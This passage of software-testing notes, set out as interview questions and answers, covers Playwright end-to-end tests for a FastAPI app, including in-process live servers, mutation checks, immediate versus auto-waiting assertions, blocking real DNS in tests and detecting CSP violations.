  10. `test_browser_check_now_result_stays_visible`: Clicks "Check now" on unverified domain with mocked verification stub, asserts outcome alert remains in DOM after network settle.

---

## 2. Five v3.4d Interview Questions & Answers

### Question 1: Why run an in-process live server thread instead of a separate subprocess or a `TEST_MODE` configuration flag?
**Answer:**
- **The Subprocess Isolation Barrier:**
  When a test harness launches a web server as an external OS subprocess (e.g. `subprocess.Popen(["uvicorn", "asm.api.main:app"])`), the server executes inside an isolated Python process with its own separate memory address space. In that architecture, pytest fixtures running in the test runner process cannot access or modify FastAPI's in-memory data structures, specifically `app.dependency_overrides`.
- **The Hazard of `TEST_MODE` Flags:**
  To work around subprocess memory isolation, developers often resort to adding configuration switches like `if settings.TEST_MODE: bypass_auth()`. Introducing test-only conditional branches into production code creates backdoors that risk accidental enablement in production, increases attack surface, and violates security hygiene.
- **The In-Process Solution:**
  By running Uvicorn inside a Python `threading.Thread` within the same process on an ephemeral port (`port=0`), the test harness shares the identical FastAPI `app` object in memory. This enables:
  1. *Per-Test Dependency Overrides:* `app.dependency_overrides[get_db]` and `app.dependency_overrides[get_current_user]` can be registered and cleared per test.
  2. *Zero Code Changes in `src/`:* Production code contains zero test flags, zero backdoors, and zero mock hooks.
  3. *Exact Production Routes:* The live browser connects to a real HTTP socket, but requests are processed through clean, test-scoped dependencies.

---

### Question 2: What is mutation testing, why must you prove a test can fail, and what silent pitfalls occurred in v3.4d?
**Answer:**
- **Why Seeing Tests Pass Is Insufficient:**
  A test that passes does not prove that the code is correct; it only proves that the test did not fail. If a test contains a logical flaw (such as asserting an element's state before a swap occurs, or asserting on conditions that are always true), the test is vacuous: it passes whether the application code works or is completely broken.
- **Proving the Test Can Fail (Mutation Check):**
  Mutation testing involves deliberately introducing a bug (a "mutant") into the application code and verifying that the test fails:
  - In v3.4d, the bug being guarded was Entry T: duplicate nested `#scan-detail-container` elements if `retryContext.swap` was omitted during 401 token refresh.
  - To verify the test, `retryContext.swap = swapStyle` was commented out in `src/asm/static/js/app.js`.
  - Running `test_browser_401_retry_preserves_single_container` resulted in `FAILED: assert 2 == 1`, confirming the test catches the bug. Restoring the line made it pass.
- **Silent Pitfalls Encountered:**
  1. *Unsaved File Edits:* An earlier mutation attempt ran pytest before saving the commented-out change to disk; the test passed because it was testing unmodified code.
  2. *Unset Test Database URL:* Another run resulted in tests being skipped because `TEST_DATABASE_URL` was not exported in the shell, which could be misread as passing if the terminal summary is not inspected.
- **Rule of Thumb:**
  Always verify the mutation diff with `git diff`, run the test, confirm the exact assertion failure, restore the code, verify clean diff, and inspect the test summary line to ensure no tests were skipped.

---

### Question 3: What is the difference between Playwright's auto-waiting `expect()` and immediate assertions, and when does auto-waiting hide bugs?
**Answer:**
- **How Auto-Waiting `expect()` Works:**
  Playwright assertions like `expect(locator).to_have_count(1)` or `expect(locator).to_be_visible()` do not assert immediately. Instead, they poll the DOM repeatedly across a timeout window (default 5 seconds) until the condition is met or the timer expires.
- **When Auto-Waiting Is Essential:**
  Auto-waiting is essential when waiting for asynchronous network operations and DOM swaps to complete. For example, waiting for `expect(page.locator(".status-badge:has-text('Status: Succeeded')")).to_be_visible()` ensures that HTMX has received the retry response and finished swapping the new markup into the DOM.
- **When Auto-Waiting Hides Critical Bugs:**
  If you use auto-waiting assertions to verify that an undesirable element is *not* present, or that a transient bad state does not occur, auto-waiting can mask failures:
  - If a temporary broken element is swapped in and later replaced, or if an assertion should hold *instantly* at a specific lifecycle boundary, an auto-waiting locator may wait until an asynchronous cleanup or subsequent action "fixes" the DOM before evaluating.
- **The Immediate Assertion Pattern:**
  After synchronizing on a definitive event via `expect(...)` (e.g. the Succeeded badge becoming visible), all structural invariant checks should use non-waiting Python assertions:
  ```python
  assert page.locator("#scan-detail-container").count() == 1
  assert page.locator("#scan-detail-container #scan-detail-container").count() == 0
  assert page.locator("#scan-detail-container").get_attribute("hx-trigger") is None
  ```
  These evaluate immediately against the current DOM state, failing without waiting if the hierarchy is malformed.

---

### Question 4: Why are server-side network calls invisible to browser request interception, and how do you ensure end-to-end tests remain hermetic?
**Answer:**
- **The Boundary of `page.route`:**
  Playwright's `page.route("**", ...)` intercepts network requests dispatched by the browser client (Chromium network stack). This includes browser `fetch()`, `XMLHttpRequest`, stylesheet loads, script tags, and image requests.
- **Server-Side Network Blindspot:**
  When a browser action triggers an HTTP endpoint on the local application server (e.g. clicking "Check now" posts to `/orgs/{org_id}/domains/{domain_id}/verification/check`), the server executes Python code in the backend process. If that Python code performs an outbound network call (such as `dnspython` querying public DNS servers or `httpx` querying external APIs), those packets originate from the server process, not Chromium. Playwright has zero visibility into or control over server-side network calls.
- **The Danger of Leaked Lookups:**
  In Phase v3.4d, the initial "Check now" test clicked the button, which invoked `check_dns_txt_verification` on the server. Because the domain was not mocked on the server, the server performed real DNS resolution against public DNS root servers, violating test hermeticity, introducing external network flakiness, and leaking internal test data.
- **The Hermetic Defense:**
  Enforce test hermeticity by adding an autouse pytest fixture (`forbid_real_dns`) that patches server-side network handlers to fail fast:
  ```python
  @pytest.fixture(autouse=True)
  def forbid_real_dns():
      def _fail_dns(*args, **kwargs):
          raise AssertionError("real DNS lookup attempted in a browser test")
      with patch("asm.api.routes.check_dns_txt_verification", side_effect=_fail_dns):
          yield
  ```
  Any test that requires DNS resolution must explicitly override this patch with a local mock stub, guaranteeing no unmonitored external network calls occur.

---

### Question 5: How do you detect Content Security Policy (CSP) violations in end-to-end browser tests when the browser does not fail HTTP requests on CSP blocks?
**Answer:**
- **The Silent Nature of CSP Violations:**
  When a browser blocks an inline script, disallowed style, or unauthorized network connection due to Content Security Policy, the HTTP request for the HTML page still succeeds with status 200. The browser simply refuses to execute the script or apply the style, logging a warning or error to the browser developer console without failing the test runner.
- **Two-Layer CSP Detection Architecture:**
  In v3.4d, CSP violations are actively captured through two complementary mechanisms in `conftest.py`:
  1. *Security Policy Violation Event Listener:*
     Before any page loads, Playwright executes an initialization script (`page.add_init_script`) that hooks the standard DOM `securitypolicyviolation` event:
     ```javascript
     window.__cspViolations = [];
     document.addEventListener('securitypolicyviolation', function(e) {
         window.__cspViolations.push({
             blockedURI: e.blockedURI,
             violatedDirective: e.violatedDirective,
             originalPolicy: e.originalPolicy
         });
     });
     ```
     During fixture teardown after the test completes, Python retrieves this array via `page.evaluate("window.__cspViolations || []")` and asserts `assert len(csp_violations) == 0`.
  2. *Console Error Listener:*
     The page fixture listens to `page.on("console", ...)` and captures any message with level `error`. Teardown asserts `assert len(console_errors) == 0`.
- **Outcome:**
  If any template or script attempts to inject inline styles, inline scripts, or connect to unapproved origins, the test suite immediately fails and prints the exact directive and blocked URI.



